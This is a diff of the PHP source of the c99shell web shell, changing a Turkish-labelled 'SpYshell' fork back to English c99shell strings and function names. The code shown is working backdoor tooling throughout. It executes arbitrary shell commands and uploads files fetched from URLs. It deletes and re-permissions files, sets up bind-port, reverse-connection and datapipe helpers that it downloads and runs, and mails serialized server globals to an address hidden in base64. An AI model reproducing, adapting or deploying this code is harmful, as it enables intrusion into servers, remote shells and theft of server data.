+if ($act == "update") {$ret = c99sh_getupdate(!!$confirmupdate); echo "<b>".$ret."</b>"; if (stristr($ret,"new version")) {echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";}}
 if ($act == "feedback")
 {
  $suppmail = base64_decode("Yzk5c2hlbGxAY2N0ZWFtLnJ1");
  if (!empty($submit))
  {
   $ticket = substr(md5(microtime()+rand(1,1000)),0,6);
-  $body = "SpYshell v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
+  $body = "c99shell v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
   if (!empty($fdbk_ref))
   {
    $tmp = @ob_get_contents();
@@ -1648,14 +1684,14 @@ if ($act == "feedback")
    echo $tmp;
    $body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";
   }
-  mail($suppmail,"SpYshell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
-  echo "<center><b>Tesekkurler kullanici id: ".$ticket.".</b></center>";
+  mail($suppmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
+  echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>";
  }
- else {echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=feedback><b>Geri besleme veya report sorun acar (".str_replace($suppmail)."Admin@spyhackerz.com):<br><br>Adin: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>e-mail Adresin : <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Mesajin :<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Server-bilgiyi ba?la* <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br><br><input type=\"submit\" name=\"submit\" value=\"Gonder\"></form>";}
+ else {echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>Your name: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>Your e-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Message:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Attach server-info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: English, Russian.<br><br><input type=\"submit\" name=\"submit\" value=\"Send\"></form>";}
 }
 if ($act == "search")
 {
- echo "<b>Sistem Dosyalarinda Ara:</b><br>";
+ echo "<b>Search in file-system:</b><br>";
  if (empty($search_in)) {$search_in = $d;}
  if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
  if (empty($search_text_wwo)) {$search_text_regexp = 0;}
@@ -1676,9 +1712,9 @@ if ($act == "search")
   );
   $searchtime = getmicrotime();
   $in = array_unique(explode(";",$search_in));
-  foreach($in as $v) {ashfsearch($v);}
+  foreach($in as $v) {c99fsearch($v);}
   $searchtime = round(getmicrotime()-$searchtime,4);
-  if (count($found) == 0) {echo "<b>Dosya Bulunamadi!</b>";}
+  if (count($found) == 0) {echo "<b>No files found!</b>";}
   else
   {
    $ls_arr = $found;
@@ -1701,7 +1737,7 @@ if ($act == "search")
 if ($act == "chmod")
 {
  $mode = fileperms($d.$f);
- if (!$mode) {echo "<b>Hata Dosya Degismedi:</b> Simdiki Value deigistirilemedi";}
+ if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
  else
  {
   $form = true;
@@ -1714,7 +1750,7 @@ if ($act == "chmod")
   if ($form)
   {
    $perms = parse_perms($mode);
-   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Hata:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Okuma<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Yazma<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">Uygulanamadi!</td><td><b>Grup</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Okuma<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">Uygulanamadi!</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Okuma<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">Uygulanamadi!</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
+   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
   }
  }
 }
@@ -1732,7 +1768,7 @@ if ($act == "upload")
   {
    if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
    else {$destin = $userfilename;}
-   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Hata Yuklenen Dosya ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";}
+   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";}
   }
   elseif (!empty($uploadurl))
   {
@@ -1747,19 +1783,18 @@ if ($act == "upload")
      $b = "";
      while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
    }
-   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Yanlis URL!
-</b><br>";}
+   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}
    else
    {
     $st = getmicrotime();
     $content = @file_get_contents($uploadurl);
     $dt = round(getmicrotime()-$st,4);
-    if (!$content) {$uploadmess .=  "Dosya Indirelemedi!<br>";}
+    if (!$content) {$uploadmess .=  "Can't download file!<br>";}
     else
     {
      if ($filestealth) {$stat = stat($uploadpath.$destin);}
      $fp = fopen($uploadpath.$destin,"w");
-     if (!$fp) {$uploadmess .= "Hata: Dosyaya Yazilamadi :( ".htmlspecialchars($destin)."!<br>";}
+     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
      else
      {
       fwrite($fp,$content,strlen($content));
@@ -1783,7 +1818,7 @@ Input URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($u
 Save this file dir: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
 File-name (auto-fill): <input name=uploadfilename size=25><br><br>
 <input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>
-<input type=submit name=submit value=\"Upload(Yukle)\">
+<input type=submit name=submit value=\"Upload\">
 </form>";
  }
 }
@@ -1794,38 +1829,38 @@ if ($act == "delete")
  {
   $result = false;
   $result = fs_rmobj($v);
-  if (!$result) {$delerr .= "Silinemedi! ".htmlspecialchars($v)."<br>";}
+  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
  }
- if (!empty($delerr)) {echo "<b>Hatalari Sil(s):</b><br>".$delerr;}
+ if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
  $act = "ls";
 }
 if (!$usefsbuff)
 {
- if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Tampon Kapali olduhu icin Yoll!!! \"\$useFSbuff\" Dogru ;)</center>";}
+ if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.</center>";}
 }
 else
 {
- if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); ash_sess_put($sess_data); $act = "ls"; }
- elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); ash_sess_put($sess_data); $act = "ls";}
- elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} ash_sess_put($sess_data); $act = "ls";}
- if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); ash_sess_put($sess_data);}
+ if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
+ elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
+ elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
+ if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
  elseif ($actpastebuff)
  {
   $psterr = "";
   foreach($sess_data["copy"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_copy_obj($v,$to)) {$psterr .= "Kopyalanamadi!! ".$v." to ".$to."!<br>";}
+   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
    if ($copy_unset) {unset($sess_data["copy"][$k]);}
   }
   foreach($sess_data["cut"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_move_obj($v,$to)) {$psterr .= "Yapistirilamadi!! ".$v." to ".$to."!<br>";}
+   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
    unset($sess_data["cut"][$k]);
   }
-  ash_sess_put($sess_data);
-  if (!empty($psterr)) {echo "<b>Yapistirma Hatasi (S):</b><br>".$psterr;}
+  c99_sess_put($sess_data);
+  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
   $act = "ls";
  }
  elseif ($actarcbuff)
@@ -1851,7 +1886,7 @@ else
   chdir($d);
   $ret = myshellexec($cmdline);
   chdir($tmp);
-  if (empty($ret)) {$arcerr .= "Arsiv Aranamiyor (Hata:3)beta By KingDefacer (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
+  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
   $ret = str_replace("\r\n","\n",$ret);
   $ret = explode("\n",$ret);
   if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
@@ -1860,8 +1895,8 @@ else
    if (in_array($v,$ret)) {fs_rmobj($v);}
    unset($sess_data["cut"][$k]);
   }
-  ash_sess_put($sess_data);
-  if (!empty($arcerr)) {echo "<b>Arsivator Hatasi:</b><br>".$arcerr;}
+  c99_sess_put($sess_data);
+  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
   $act = "ls";
  }
  elseif ($actpastebuff)
@@ -1870,17 +1905,17 @@ else
   foreach($sess_data["copy"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_copy_obj($v,$d)) {$psterr .= "Kopyalanamadi!! ".$v." to ".$to."!<br>";}
+   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
    if ($copy_unset) {unset($sess_data["copy"][$k]);}
   }
   foreach($sess_data["cut"] as $k=>$v)
   {
    $to = $d.basename($v);
-   if (!fs_move_obj($v,$d)) {$psterr .= "Yapistirilamadi! ".$v." to ".$to."!<br>";}
+   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
    unset($sess_data["cut"][$k]);
   }
-  ash_sess_put($sess_data);
-  if (!empty($psterr)) {echo "<b>Yapistirma Hatasi:</b><br>".$psterr;}
+  c99_sess_put($sess_data);
+  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
   $act = "ls";
  }
 }
@@ -1893,7 +1928,7 @@ else
  @chdir($chdir);
  if (!empty($submit))
  {
-  echo "<b>Ugulamanin Sonuclari</b>:<br>";
+  echo "<b>Result of execution this command</b>:<br>";
   $olddir = realpath(".");
   @chdir($d);
   $ret = myshellexec($cmd);
@@ -1907,8 +1942,8 @@ else
   else {echo $ret."<br>";}
   @chdir($olddir);
  }
- else {echo "<b>Uygulama Yonet </b>"; if (empty($cmd_txt)) {$cmd_txt = true;}}
- echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Tamam\">&nbsp;Metni Alan icinde goster&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
+ else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = true;}}
+ echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
 }
 }
 if ($act == "ls")
@@ -1924,7 +1959,7 @@ if ($act == "ls")
   }
   else {}
  }
- if (count($list) == 0) {echo "<center><b>Klasor Acilamiyor. (".htmlspecialchars($d).")!</b></center>";}
+ if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
  else
  {
   //Building array
@@ -1965,13 +2000,13 @@ if ($act == "ls")
     $i++;
    }
    $row = array();
-   $row[] = "<b>Isim</b>";
-   $row[] = "<b>Boyut</b>";
-   $row[] = "<b>Degistirme</b>";
+   $row[] = "<b>Name</b>";
+   $row[] = "<b>Size</b>";
+   $row[] = "<b>Modify</b>";
    if (!$win)
-  {$row[] = "<b>Sahip/Grup</b>";}
-   $row[] = "<b>Permissions(Yetki)</b>";
-   $row[] = "<b>Oznitelik</b>";
+  {$row[] = "<b>Owner/Group</b>";}
+   $row[] = "<b>Perms</b>";
+   $row[] = "<b>Action</b>";
    $parsesort = parsesort($sort);
    $sort = $parsesort[0].$parsesort[1];
    $k = $parsesort[0];
@@ -2014,7 +2049,7 @@ if ($act == "ls")
     {
      if (ereg($r[0],$o))
      {
-      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Uyari! Konfigirasyon i?inde hata \$regxp_highlight[".$k."][0] - Bilinmeyen Komut."; ashshexit();}
+      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
       else
       {
        $r[1] = round($r[1]);
@@ -2071,8 +2106,8 @@ if ($act == "ls")
     $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";
     if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
     else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
-    if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Bilgi\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;".$checkbox;}
-    else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Bilgi\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Degistir\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Indir\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;".$checkbox;}
+    if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;".$checkbox;}
+    else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;".$checkbox;}
     if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
     elseif (is_link($v)) {$tab["links"][] = $row;}
     elseif (is_dir($v)) {$tab["folders"][] = $row;}
@@ -2082,7 +2117,7 @@ if ($act == "ls")
   }
   //Compiling table
   $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
-  echo "<center><b>Listelenen (".count($tab["files"])." dosya ve ".(count($tab["folders"])+count($tab["links"]))." klasor):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";
+  echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";
   foreach($table as $row)
   {
    echo "<tr>\r\n";
@@ -2112,38 +2147,38 @@ if ($act == "ls")
    }
   }
   </script>
-  <input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Hepsini Sec\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Hepsini Sec(ME)\"> 
+  <input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\"> 
   <b><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";
   if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))
   {
-   echo "<input type=submit name=actarcbuff value=\"Pack, arsivi korur\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Yapistir\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Bos tampon\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
+   echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
   }
-  echo "<select name=act><option value=\"".$act."\">(Secin):</option>";
-  echo "<option value=delete".($dspact == "delete"?" selected":"").">SiL</option>";
-  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Mod Degistir</option>";
+  echo "<select name=act><option value=\"".$act."\">With selected:</option>";
+  echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
+  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
   if ($usefsbuff)
   {
-   echo "<option value=cut".($dspact == "cut"?" selected":"").">KES</option>";
-   echo "<option value=copy".($dspact == "copy"?" selected":"").">KOPYALA</option>";
-   echo "<option value=unselect".($dspact == "unselect"?" selected":"").">SECME(Unselect)</option>";
+   echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";
+   echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";
+   echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";
   }
-  echo "</select>&nbsp;<input type=submit value=\"OK!\"></p>";
+  echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>";
   echo "</form>";
  }
 }
 if ($act == "tools")
 {
  $bndportsrcs = array(
-  "ashsh_bindport.pl"=>array("PERL Kullan","perl %path %port"),
-  "ashsh_bindport.c"=>array("C Kullan","%path %port %pass")
+  "c99sh_bindport.pl"=>array("Using PERL","perl %path %port"),
+  "c99sh_bindport.c"=>array("Using C","%path %port %pass")
  );
  $bcsrcs = array(
-  "ashsh_backconn.pl"=>array("PERL Kullan","perl %path %host %port"),
-  "ashsh_backconn.c"=>array("C Kullan","%path %host %port")
+  "c99sh_backconn.pl"=>array("Using PERL","perl %path %host %port"),
+  "c99sh_backconn.c"=>array("Using C","%path %host %port")
  );
  $dpsrcs = array(
-  "ashsh_datapipe.pl"=>array("PERL Kullan","perl %path %localport %remotehost %remoteport"),
-  "ashsh_datapipe.c"=>array("C Kullan","%path %localport %remoteport %remotehost")
+  "c99sh_datapipe.pl"=>array("Using PERL","perl %path %localport %remotehost %remoteport"),
+  "c99sh_datapipe.c"=>array("Using C","%path %localport %remoteport %remotehost")
  );
  if (!is_array($bind)) {$bind = array();}
  if (!is_array($bc)) {$bc = array();}
@@ -2159,10 +2194,10 @@ if ($act == "tools")
  if (!is_numeric($datapipe["localport"])) {$datapipe["localport"] = $datapipe_localport;}
  if (!empty($bindsubmit))
  {
-  echo "<b>Port Baglanti sonucu:</b><br>";
+  echo "<b>Result of binding port:</b><br>";
   $v = $bndportsrcs[$bind["src"]];
   if (empty($v)) {echo "Unknown file!<br>";}
-  elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port Kullaniliyor,diger port Seciniz!<br>";}
+  elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}
   else
   {
    $w = explode(".",$bind["src"]);
@@ -2173,8 +2208,8 @@ if ($act == "tools")
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
-   if (!$fp) {echo "Kaynak Koduna Yazilamadi--> \"".$srcpath."\"!<br>";}
-   elseif (!$data = ashgetsource($bind["src"])) {echo "Kaynak Kodu Indirilemedi!";}
+   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
+   elseif (!$data = c99getsource($bind["src"])) {echo "Can't download sources!";}
    else
    {
     fwrite($fp,$data,strlen($data));
@@ -2187,15 +2222,15 @@ if ($act == "tools")
     $retbind = myshellexec($v[1]." > /dev/null &");
     sleep(5);
     $sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);
-    if (!$sock) {echo "Baglanilamadi localhost a :".$bind["port"]."! Friwall ini kontrol Etmeni Dusunuyorum";}
-    else {echo "Baglaniyor.......Tamam! Baglandi..--> <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>!NetCat'i Kullanio..\"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>Baglamalari gor!!</u></a></center>";}
+    if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}
+    else {echo "Binding... ok! Connect to <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View binder's process</u></a></center>";}
    }
    echo "<br>";
   }
  }
  if (!empty($bcsubmit))
  {
-  echo "<b>Eski Baglanti Sonuclari:</b><br>";
+  echo "<b>Result of back connection:</b><br>";
   $v = $bcsrcs[$bc["src"]];
   if (empty($v)) {echo "Unknown file!<br>";}
   else
@@ -2208,8 +2243,8 @@ if ($act == "tools")
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
-   if (!$fp) {echo "Kaynak Koduna Yazilamadi ---> \"".$srcpath."\"!<br>";}
-   elseif (!$data = ashgetsource($bc["src"])) {echo "Kaynak Kodu indirilemedi!!!!";}
+   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
+   elseif (!$data = c99getsource($bc["src"])) {echo "Can't download sources!";}
    else
    {
     fwrite($fp,$data,strlen($data));
@@ -2220,16 +2255,16 @@ if ($act == "tools")
     $v[1] = str_replace("%port",$bc["port"],$v[1]);
     $v[1] = str_replace("//","/",$v[1]);
     $retbind = myshellexec($v[1]." > /dev/null &");
-    echo "Su an ki Script tekrar dene ".htmlspecialchars($bc["host"]).":".htmlspecialchars($bc["port"])."...<br>";
+    echo "Now script try connect to ".htmlspecialchars($bc["host"]).":".htmlspecialchars($bc["port"])."...<br>";
    }
   }
  }
  if (!empty($dpsubmit))
  {
-  echo "<b>Datapipe Sonuclari:</b><br>";
+  echo "<b>Result of datapipe-running:</b><br>";
   $v = $dpsrcs[$datapipe["src"]];
-  if (empty($v)) {echo "Bilinmeyen Dosya!<br>";}
-  elseif (fsockopen(getenv("SERVER_ADDR"),$datapipe["port"],$errno,$errstr,0.1)) {echo "Port Kullaniliyor Baska port Secin!<br>";}
+  if (empty($v)) {echo "Unknown file!<br>";}
+  elseif (fsockopen(getenv("SERVER_ADDR"),$datapipe["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}
   else
   {
    $srcpath = $tmpdir.$datapipe["src"];
@@ -2242,7 +2277,7 @@ if ($act == "tools")
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
    if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
-   elseif (!$data = ashgetsource($datapipe["src"])) {echo "Kaynak Kodu indirilemedi!";}
